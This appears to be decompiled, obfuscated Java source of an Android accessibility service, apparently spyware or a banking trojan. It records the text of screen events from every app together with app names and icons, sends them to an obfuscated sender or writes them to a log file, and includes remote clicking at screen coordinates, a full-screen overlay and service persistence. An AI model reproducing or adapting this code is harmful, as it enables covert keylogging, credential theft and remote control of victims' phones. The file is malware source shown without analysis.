    public void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32ActivSend(AccessibilityEvent accessibilityEvent) {
        ApplicationInfo applicationInfo;
        try {
            getEventText(accessibilityEvent);
            String str = (String) accessibilityEvent.getPackageName();
            PackageManager packageManager = getApplicationContext().getPackageManager();
            try {
                applicationInfo = packageManager.getApplicationInfo(str, 0);
            } catch (PackageManager.NameNotFoundException unused) {
                applicationInfo = null;
            }
            outerypatientsivaliumgacquisitionsacasiootreatyqintegratingoeligibleotransactionmleonegboringj4.climatenpostersxpromptnlimitationsvbehaviornshortlysconsiderableibannersadramaticlpolicygtapx47(safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.A_safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5_A, ((String) (applicationInfo != null ? packageManager.getApplicationLabel(applicationInfo) : advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.c_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_mn[3])).getBytes());
        } catch (Exception unused2) {
        }
    }

    public static Bitmap drawableToBitmap(Drawable drawable) {
        Bitmap bitmap = null;
        try {
            if (drawable instanceof BitmapDrawable) {
                BitmapDrawable bitmapDrawable = (BitmapDrawable) drawable;
                if (bitmapDrawable.getBitmap() != null) {
                    return bitmapDrawable.getBitmap();
                }
            }
            if (drawable.getIntrinsicWidth() > 0) {
                if (drawable.getIntrinsicHeight() > 0) {
                    bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
                    Canvas canvas = new Canvas(bitmap);
                    drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                    drawable.draw(canvas);
                    return bitmap;
                }
            }
            bitmap = Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888);
            Canvas canvas2 = new Canvas(bitmap);
            drawable.setBounds(0, 0, canvas2.getWidth(), canvas2.getHeight());
            drawable.draw(canvas2);
        } catch (Exception unused) {
        }
        return bitmap;
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(9:3|4|5|(9:9|(2:13|(2:15|(2:17|60))(1:59))|18|19|20|21|22|(2:26|27)(1:28)|29)|30|31|(11:33|(4:37|(2:39|(1:41))|54|55)|42|43|44|(2:47|48)(1:49)|50|51|52|53|63)|56|61) */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:21:0x007b */
    /* JADX WARNING: Missing exception handler attribute for start block: B:30:0x00d6 */
    /* JADX WARNING: Removed duplicated region for block: B:26:0x0083 A[SYNTHETIC, Splitter:B:26:0x0083] */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x0088 A[Catch:{ Exception -> 0x00d6 }] */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x00e0 A[Catch:{ Exception -> 0x0159 }] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32sendlog(android.view.accessibility.AccessibilityEvent r17, int r18) {
        /*
            r16 = this;
            java.lang.String r0 = "#"
            java.lang.String r1 = "]"
            java.lang.String r2 = "["
            java.lang.String r3 = ""
            if (r17 != 0) goto L_0x000b
            return
        L_0x000b:
            r4 = 3
            r5 = 0
            r6 = 0
            r7 = 1
            boolean r8 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.k     // Catch:{ Exception -> 0x00d6 }
            if (r8 == 0) goto L_0x00d6
            boolean r8 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.k_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_live     // Catch:{ Exception -> 0x00d6 }
            if (r8 == 0) goto L_0x00d6
            java.util.List r8 = r17.getText()     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r8 = r8.toString()     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r8 = r8.replace(r2, r3)     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r8 = r8.replace(r1, r3)     // Catch:{ Exception -> 0x00d6 }
            int r9 = r8.length()     // Catch:{ Exception -> 0x00d6 }
            if (r9 < r7) goto L_0x0033
            boolean r9 = r8.isEmpty()     // Catch:{ Exception -> 0x00d6 }
            if (r9 == 0) goto L_0x0049
        L_0x0033:
            java.lang.CharSequence r8 = r17.getContentDescription()     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r8 = r8.toString()     // Catch:{ Exception -> 0x00d6 }
            int r9 = r8.length()     // Catch:{ Exception -> 0x00d6 }
            if (r9 < r7) goto L_0x00d5
            boolean r9 = r8.isEmpty()     // Catch:{ Exception -> 0x00d6 }
            if (r9 == 0) goto L_0x0049
            goto L_0x00d5
        L_0x0049:
            java.lang.CharSequence r9 = r17.getPackageName()     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r9 = (java.lang.String) r9     // Catch:{ Exception -> 0x00d6 }
            android.content.Context r10 = r16.getApplicationContext()     // Catch:{ Exception -> 0x00d6 }
            android.content.pm.PackageManager r10 = r10.getPackageManager()     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r11 = "null"
            android.content.Context r12 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.app_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_Context     // Catch:{ NameNotFoundException -> 0x007b }
            android.content.pm.PackageManager r12 = r12.getPackageManager()     // Catch:{ NameNotFoundException -> 0x007b }
            android.graphics.drawable.Drawable r12 = r12.getApplicationIcon(r9)     // Catch:{ NameNotFoundException -> 0x007b }
            java.io.ByteArrayOutputStream r13 = new java.io.ByteArrayOutputStream     // Catch:{ NameNotFoundException -> 0x007b }
            r13.<init>()     // Catch:{ NameNotFoundException -> 0x007b }
            android.graphics.Bitmap r12 = drawableToBitmap(r12)     // Catch:{ NameNotFoundException -> 0x007b }
            android.graphics.Bitmap$CompressFormat r14 = android.graphics.Bitmap.CompressFormat.JPEG     // Catch:{ NameNotFoundException -> 0x007b }
            r15 = 50
            r12.compress(r14, r15, r13)     // Catch:{ NameNotFoundException -> 0x007b }
            byte[] r12 = r13.toByteArray()     // Catch:{ NameNotFoundException -> 0x007b }
            java.lang.String r11 = android.util.Base64.encodeToString(r12, r6)     // Catch:{ NameNotFoundException -> 0x007b }
        L_0x007b:
            android.content.pm.ApplicationInfo r9 = r10.getApplicationInfo(r9, r6)     // Catch:{ NameNotFoundException -> 0x0080 }
            goto L_0x0081
        L_0x0080:
            r9 = r5
        L_0x0081:
            if (r9 == 0) goto L_0x0088
            java.lang.CharSequence r9 = r10.getApplicationLabel(r9)     // Catch:{ Exception -> 0x00d6 }
            goto L_0x008c
        L_0x0088:
            java.lang.String[] r9 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.c_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_mn     // Catch:{ Exception -> 0x00d6 }
            r9 = r9[r4]     // Catch:{ Exception -> 0x00d6 }
        L_0x008c:
            java.lang.String r9 = (java.lang.String) r9     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r9 = (java.lang.String) r9     // Catch:{ Exception -> 0x00d6 }
            java.lang.StringBuilder r10 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x00d6 }
            r10.<init>()     // Catch:{ Exception -> 0x00d6 }
            java.lang.String[] r12 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.c_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_mn     // Catch:{ Exception -> 0x00d6 }
            r12 = r12[r7]     // Catch:{ Exception -> 0x00d6 }
            r10.append(r12)     // Catch:{ Exception -> 0x00d6 }
            java.lang.String[] r12 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.c_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_mn     // Catch:{ Exception -> 0x00d6 }
            r13 = 2
            r12 = r12[r13]     // Catch:{ Exception -> 0x00d6 }
            r10.append(r12)     // Catch:{ Exception -> 0x00d6 }
            r10.append(r9)     // Catch:{ Exception -> 0x00d6 }
            java.lang.String[] r9 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.c_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_mn     // Catch:{ Exception -> 0x00d6 }
            r9 = r9[r13]     // Catch:{ Exception -> 0x00d6 }
            r10.append(r9)     // Catch:{ Exception -> 0x00d6 }
            r10.append(r8)     // Catch:{ Exception -> 0x00d6 }
            java.lang.String[] r8 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.c_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_mn     // Catch:{ Exception -> 0x00d6 }
            r8 = r8[r13]     // Catch:{ Exception -> 0x00d6 }
            r10.append(r8)     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r8 = java.lang.String.valueOf(r18)     // Catch:{ Exception -> 0x00d6 }
            r10.append(r8)     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r8 = "<0>"
            r10.append(r8)     // Catch:{ Exception -> 0x00d6 }
            r10.append(r11)     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r8 = r10.toString()     // Catch:{ Exception -> 0x00d6 }
            java.lang.String r9 = "\t"
            byte[] r9 = r9.getBytes()     // Catch:{ Exception -> 0x00d6 }
            com.appser.outerypatientsivaliumgacquisitionsacasiootreatyqintegratingoeligibleotransactionmleonegboringj4.climatenpostersxpromptnlimitationsvbehaviornshortlysconsiderableibannersadramaticlpolicygtapx47(r8, r9)     // Catch:{ Exception -> 0x00d6 }
            goto L_0x00d6
        L_0x00d5:
            return
        L_0x00d6:
            java.lang.String r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32OFK     // Catch:{ Exception -> 0x0159 }
            java.lang.String r9 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32OFFOK     // Catch:{ Exception -> 0x0159 }
            boolean r8 = r8.equals(r9)     // Catch:{ Exception -> 0x0159 }
            if (r8 == 0) goto L_0x0159
            java.util.List r8 = r17.getText()     // Catch:{ Exception -> 0x0159 }
            java.lang.String r8 = r8.toString()     // Catch:{ Exception -> 0x0159 }
            java.lang.String r2 = r8.replace(r2, r3)     // Catch:{ Exception -> 0x0159 }
            java.lang.String r1 = r2.replace(r1, r3)     // Catch:{ Exception -> 0x0159 }
            int r2 = r1.length()     // Catch:{ Exception -> 0x0159 }
            if (r2 < r7) goto L_0x00fc
            boolean r2 = r1.isEmpty()     // Catch:{ Exception -> 0x0159 }
            if (r2 == 0) goto L_0x0111
        L_0x00fc:
            java.lang.CharSequence r1 = r17.getContentDescription()     // Catch:{ Exception -> 0x0159 }
            java.lang.String r1 = r1.toString()     // Catch:{ Exception -> 0x0159 }
            int r2 = r1.length()     // Catch:{ Exception -> 0x0159 }
            if (r2 < r7) goto L_0x0156
            boolean r2 = r1.isEmpty()     // Catch:{ Exception -> 0x0159 }
            if (r2 == 0) goto L_0x0111
            goto L_0x0156
        L_0x0111:
            java.lang.CharSequence r2 = r17.getPackageName()     // Catch:{ Exception -> 0x0159 }
            java.lang.String r2 = (java.lang.String) r2     // Catch:{ Exception -> 0x0159 }
            android.content.Context r3 = r16.getApplicationContext()     // Catch:{ Exception -> 0x0159 }
            android.content.pm.PackageManager r3 = r3.getPackageManager()     // Catch:{ Exception -> 0x0159 }
            android.content.pm.ApplicationInfo r5 = r3.getApplicationInfo(r2, r6)     // Catch:{ NameNotFoundException -> 0x0124 }
            goto L_0x0125
        L_0x0124:
        L_0x0125:
            if (r5 == 0) goto L_0x012c
            java.lang.CharSequence r2 = r3.getApplicationLabel(r5)     // Catch:{ Exception -> 0x0159 }
            goto L_0x0130
        L_0x012c:
            java.lang.String[] r2 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.c_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_mn     // Catch:{ Exception -> 0x0159 }
            r2 = r2[r4]     // Catch:{ Exception -> 0x0159 }
        L_0x0130:
            java.lang.String r2 = (java.lang.String) r2     // Catch:{ Exception -> 0x0159 }
            java.lang.String r2 = (java.lang.String) r2     // Catch:{ Exception -> 0x0159 }
            java.lang.StringBuilder r3 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0159 }
            r3.<init>()     // Catch:{ Exception -> 0x0159 }
            r3.append(r2)     // Catch:{ Exception -> 0x0159 }
            r3.append(r0)     // Catch:{ Exception -> 0x0159 }
            r3.append(r1)     // Catch:{ Exception -> 0x0159 }
            r3.append(r0)     // Catch:{ Exception -> 0x0159 }
            java.lang.String r0 = java.lang.String.valueOf(r18)     // Catch:{ Exception -> 0x0159 }
            r3.append(r0)     // Catch:{ Exception -> 0x0159 }
            java.lang.String r0 = r3.toString()     // Catch:{ Exception -> 0x0159 }
            r1 = r16
            r1.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32writeFile(r0)     // Catch:{ Exception -> 0x015b }
            goto L_0x015b
        L_0x0156:
            r1 = r16
            return
        L_0x0159:
            r1 = r16
        L_0x015b:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32sendlog(android.view.accessibility.AccessibilityEvent, int):void");
    }

    public void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32click(int i, int i2) {
        try {
            if (Build.VERSION.SDK_INT > 16) {
                advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32clickAtPosition(i, i2, getRootInActiveWindow());
            }
        } catch (Exception unused) {
        }
    }

    public static void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32clickAtPosition(int i, int i2, AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            try {
                if (accessibilityNodeInfo.getChildCount() == 0) {
                    Rect rect = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect);
                    if (rect.contains(i, i2)) {
                        accessibilityNodeInfo.performAction(16);
                        return;
                    }
                    return;
                }
                Rect rect2 = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect2);
                if (rect2.contains(i, i2)) {
                    accessibilityNodeInfo.performAction(16);
                }
                for (int i3 = 0; i3 < accessibilityNodeInfo.getChildCount(); i3++) {
                    advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32clickAtPosition(i, i2, accessibilityNodeInfo.getChild(i3));
                }
            } catch (Exception unused) {
            }
        }
    }

    public boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32ShowActivite(Class cls) {
        try {
            startActivity(new Intent(this, cls).addFlags(268435456).addFlags(536870912));
            return true;
        } catch (Exception unused) {
            return false;
        }
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(13:0|1|2|3|4|(3:5|6|(1:10))|11|13|14|(1:16)|17|18|(2:20|25)(2:21|23)) */
    /* JADX WARNING: Can't wrap try/catch for region: R(15:0|1|2|3|4|5|6|(1:10)|11|13|14|(1:16)|17|18|(2:20|25)(2:21|23)) */
    /* JADX WARNING: Code restructure failed: missing block: B:24:?, code lost:
        return;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:17:0x008c */
    /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x001b */
    /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x0046 */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0082 A[Catch:{ Exception -> 0x008c }] */
    /* JADX WARNING: Removed duplicated region for block: B:20:0x0092 A[Catch:{ Exception -> 0x00af }] */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x00a1 A[Catch:{ Exception -> 0x00af }] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onServiceConnected() {
        /*
            r9 = this;
            super.onServiceConnected()
            android.accessibilityservice.AccessibilityServiceInfo r0 = new android.accessibilityservice.AccessibilityServiceInfo     // Catch:{ Exception -> 0x001b }
            r0.<init>()     // Catch:{ Exception -> 0x001b }
            r1 = 19
            r0.flags = r1     // Catch:{ Exception -> 0x001b }
            r1 = -1
            r0.eventTypes = r1     // Catch:{ Exception -> 0x001b }
            r2 = 0
            r0.notificationTimeout = r2     // Catch:{ Exception -> 0x001b }
            r2 = 0
            r0.packageNames = r2     // Catch:{ Exception -> 0x001b }
            r0.feedbackType = r1     // Catch:{ Exception -> 0x001b }
            r9.setServiceInfo(r0)     // Catch:{ Exception -> 0x001b }
        L_0x001b:
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.MyAccess = r9     // Catch:{ Exception -> 0x0046 }
            r9.getApplicationContext()     // Catch:{ Exception -> 0x0046 }
            java.lang.String r0 = "window"
            java.lang.Object r0 = r9.getSystemService(r0)     // Catch:{ Exception -> 0x0046 }
            android.view.WindowManager r0 = (android.view.WindowManager) r0     // Catch:{ Exception -> 0x0046 }
            android.widget.FrameLayout r1 = new android.widget.FrameLayout     // Catch:{ Exception -> 0x0046 }
            r1.<init>(r9)     // Catch:{ Exception -> 0x0046 }
            android.view.WindowManager$LayoutParams r8 = new android.view.WindowManager$LayoutParams     // Catch:{ Exception -> 0x0046 }
            r3 = 1
            r4 = 1
            r5 = 2032(0x7f0, float:2.847E-42)
            r6 = -2142501864(0xffffffff804c0418, float:-6.980966E-39)
            r7 = -3
            r2 = r8
            r2.<init>(r3, r4, r5, r6, r7)     // Catch:{ Exception -> 0x0046 }
            r2 = 48
            r8.gravity = r2     // Catch:{ Exception -> 0x0046 }
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32lay = r8     // Catch:{ Exception -> 0x0046 }
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32wm = r0     // Catch:{ Exception -> 0x0046 }
            r0.addView(r1, r8)     // Catch:{ Exception -> 0x0046 }
        L_0x0046:
            java.lang.String r0 = com.appser.deckmformulawamendedjdeleteddkgoaccessingeliveehourlykbreastaproposexdisciplinevwellsbbelfastl10.T_deckmformulawamendedjdeleteddkgoaccessingeliveehourlykbreastaproposexdisciplinevwellsbbelfastl10_P     // Catch:{ Exception -> 0x0076 }
            android.content.pm.PackageManager r1 = r9.getPackageManager()     // Catch:{ Exception -> 0x0076 }
            boolean r0 = com.appser.deckmformulawamendedjdeleteddkgoaccessingeliveehourlykbreastaproposexdisciplinevwellsbbelfastl10.IP_deckmformulawamendedjdeleteddkgoaccessingeliveehourlykbreastaproposexdisciplinevwellsbbelfastl10_I(r0, r1)     // Catch:{ Exception -> 0x0076 }
            if (r0 == 0) goto L_0x0076
            java.lang.String r0 = com.appser.deckmformulawamendedjdeleteddkgoaccessingeliveehourlykbreastaproposexdisciplinevwellsbbelfastl10.T_deckmformulawamendedjdeleteddkgoaccessingeliveehourlykbreastaproposexdisciplinevwellsbbelfastl10_P     // Catch:{ Exception -> 0x0076 }
            java.lang.String r0 = r0.toLowerCase()     // Catch:{ Exception -> 0x0076 }
            java.lang.String r1 = "null"
            boolean r0 = r0.equals(r1)     // Catch:{ Exception -> 0x0076 }
            if (r0 != 0) goto L_0x0076
            android.content.Context r0 = r9.getApplicationContext()     // Catch:{ Exception -> 0x0076 }
            android.content.pm.PackageManager r0 = r0.getPackageManager()     // Catch:{ Exception -> 0x0076 }
            java.lang.String r1 = com.appser.deckmformulawamendedjdeleteddkgoaccessingeliveehourlykbreastaproposexdisciplinevwellsbbelfastl10.T_deckmformulawamendedjdeleteddkgoaccessingeliveehourlykbreastaproposexdisciplinevwellsbbelfastl10_P     // Catch:{ Exception -> 0x0076 }
            android.content.Intent r0 = r0.getLaunchIntentForPackage(r1)     // Catch:{ Exception -> 0x0076 }
            r1 = 268435456(0x10000000, float:2.5243549E-29)
            r0.addFlags(r1)     // Catch:{ Exception -> 0x0076 }
            r9.startActivity(r0)     // Catch:{ Exception -> 0x0076 }
        L_0x0076:
            java.lang.Class<com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31> r0 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.class
            android.app.Application r1 = r9.getApplication()     // Catch:{ Exception -> 0x008c }
            boolean r0 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex30.segavsphereksaturnbsusedcognitiveoplacinggviewsvruntimerbrazilianmgenderesslhfouldhelpsrperspectivesz49(r0, r1)     // Catch:{ Exception -> 0x008c }
            if (r0 == 0) goto L_0x008c
            android.content.Intent r0 = new android.content.Intent     // Catch:{ Exception -> 0x008c }
            java.lang.Class<com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31> r1 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.class
            r0.<init>(r9, r1)     // Catch:{ Exception -> 0x008c }
            r9.startService(r0)     // Catch:{ Exception -> 0x008c }
        L_0x008c:
            int r0 = android.os.Build.VERSION.SDK_INT     // Catch:{ Exception -> 0x00af }
            r1 = 26
            if (r0 < r1) goto L_0x00a1
            android.content.Intent r0 = new android.content.Intent     // Catch:{ Exception -> 0x00af }
            android.content.Context r1 = r9.getApplicationContext()     // Catch:{ Exception -> 0x00af }
            java.lang.Class<com.appser.myworker> r2 = com.appser.myworker.class
            r0.<init>(r1, r2)     // Catch:{ Exception -> 0x00af }
            r9.startForegroundService(r0)     // Catch:{ Exception -> 0x00af }
            goto L_0x00af
        L_0x00a1:
            android.content.Intent r0 = new android.content.Intent     // Catch:{ Exception -> 0x00af }
            android.content.Context r1 = r9.getApplicationContext()     // Catch:{ Exception -> 0x00af }
            java.lang.Class<com.appser.myworker> r2 = com.appser.myworker.class
            r0.<init>(r1, r2)     // Catch:{ Exception -> 0x00af }
            r9.startService(r0)     // Catch:{ Exception -> 0x00af }
        L_0x00af:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.onServiceConnected():void");
    }
}
